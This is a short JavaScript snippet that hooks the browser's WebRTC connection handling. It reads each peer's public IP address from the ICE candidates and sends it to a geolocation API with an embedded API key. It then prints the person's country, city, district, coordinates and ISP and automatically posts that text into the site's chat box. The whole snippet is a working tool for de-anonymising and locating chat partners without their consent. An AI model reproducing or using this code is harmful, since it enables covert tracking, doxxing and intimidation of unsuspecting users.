let keyapi = "bc11a80f20ff405ba19f653948571875";
window.oRTCPeerConnection =
    window.oRTCPeerConnection || window.RTCPeerConnection;
window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        console.log(iceCandidate.candidate);
        console.log(fields)
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};
let getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${keyapi}&ip=${ip}`;
    await fetch(url).then((response) =>
        response.json().then((json) => {
            const output = `
-------------------------------
IP: ${ip}
Country: ${json.country_name}
Country Capital: ${json.country_capital}
State: ${json.state_prov}
City: ${json.city}
District: ${json.district}
Lat / Long: (${json.latitude}, ${json.longitude})
ISP: ${json.isp}
-------------------------------
          `;
            console.log(output);
            function sendmsg()
        {
          let messageBox = document.querySelector('.chatmsg')
          let sendBtn = document.querySelector('.sendbtn')
          messageBox.innerHTML=output
          sendBtn.click()
        }

        sendmsg()
        })
    );
};
